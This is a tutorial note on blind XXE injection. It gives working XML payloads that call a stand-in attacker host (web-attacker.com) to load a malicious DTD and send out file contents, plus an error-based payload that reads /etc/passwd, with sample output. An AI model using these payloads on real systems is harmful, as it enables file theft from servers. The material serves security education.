# Blind XXE

## What is blind XXE?
Blind XXE is when the application is vulnerable to XXE but the response is not being shown, so you can get any information out of this vulnerability. You can just not just check whether the application is vulnerable to blind XXE or not rather you can also exfiltrate the data.

## Exploiting the vulnerability
- Using OAST domain. One way is to declare an external entity with the URL as your unique domain from collaborator, so that when you send the request you can check whether there is any DNS or HTTP Request to your domain. This is somewhat similar to blind SSRF.
- Using parameter entity instead of normal entity.
- The difference between normal entity and parameter entity is that the parameter entity can be used only within DTD unlike normal entity which can be used anywhere within the XML data.
- Morever, the normal entity is declared with <code>&xxe;</code> and parameter entity is declared with <code>%xxe;</code>
- Morever the syntax of declaration of parameter entity is:\
<code>\<!ENTITY % myparameterentity "my parameter entity value" ></code>
- You can perform blind XXE using parameter entity like this:\
<code>\<!DOCTYPE foo [ \<!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]></code>
- After confirming a blind XXE vulnerability using OAST, the next step is to determine whether data can be exfiltrated out-of-band.
In blind XXE, the application does not return the contents of the resource in its response. Therefore, an attacker can use an external malicious DTD to make the XML parser send the data to an attacker-controlled server.
- Main XML Payload:
<code>\<!DOCTYPE foo [
    \<!ENTITY % xxe SYSTEM "https://web-attacker.com/malicious.dtd">
    %xxe;
]></code>
- xxe is a parameter entity and points to malicous.dtd on the attacker's server.
- The attacker's malicious.dtd can define entities that read data and construct an exfiltration request:
<code>\<!ENTITY % file SYSTEM "file:///allowed-test-resource">
\<!ENTITY % eval "\<!ENTITY &#x25; exfiltrate SYSTEM 'https://web-attacker.com/?x=%file;'>">\
%eval;\
%exfiltrate;</code>
- Now what this means is that file reads the value of the protected or important file and then eval creates the exfiltrate entity. Any statement within eval is evaluated, and now exfiltrate is also a parameter entity and what it does is it makes request to the attacker's domain along with the file content in the URL which attacker can access easily.
- Another way to exploit XXE vulnerability is by triggering an error and if the error is returned within the response, then it is a goldmine for attacker if the error contains the information that the attacker wish to receive.
- <code>\<!ENTITY % file SYSTEM "file:///etc/passwd">
\<!ENTITY % eval "\<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">\
%eval;\
%error;</code>
- In this payload, what is being done is that the file is declared as a parameter entity which reads the file content of the important file. Then eval is declared which in turn declared the error parameter entity which is trying to fetch the content of an non existing file, which will create an error.
- This can give an error like this:\
<code>java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...</code>
